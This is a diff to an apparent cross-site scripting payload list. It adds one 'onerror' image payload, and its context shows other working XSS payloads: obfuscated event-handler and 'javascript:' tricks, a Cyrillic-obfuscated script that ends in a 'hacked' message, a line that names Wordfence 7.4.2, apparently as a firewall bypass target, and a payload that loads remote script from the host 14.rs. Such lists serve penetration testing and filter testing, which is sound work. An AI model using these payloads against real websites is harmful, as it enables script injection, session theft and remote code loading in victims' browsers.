@@ -6,6 +6,7 @@
 <0 name="<svg/onload=alert(1)>">
 </ <a href="><svg/onload=alert(1)>">
 <?<a href="><svg/onload=alert(2)>">
+<42 asd="<img src=x onerror=alert(1)>">x</42>
 1"><A HRef=%26quot AutoFocus OnFocus%0C={import(/https:http://14.rs/.source)}>
 <iframe/onload​='this["src"]="javas&Tab;cript​:al"+"ert``"';>
 <img src=x onerror​=ja&#x76;ascript​:al&#x65;rt(1)>
@@ -1767,6 +1768,7 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
 
